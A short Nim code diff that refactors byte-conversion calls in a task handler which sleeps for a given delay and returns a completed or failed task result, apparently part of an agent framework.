@@ -30,7 +30,7 @@ when defined(agent):
 
         try: 
             # Parse task parameter
-            let delay = int(task.args[0].data.toUint32())
+            let delay = int(Bytes.toUint32(task.args[0].data))
 
             echo fmt"   [>] Sleeping for {delay} seconds."
             
@@ -41,4 +41,4 @@ when defined(agent):
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
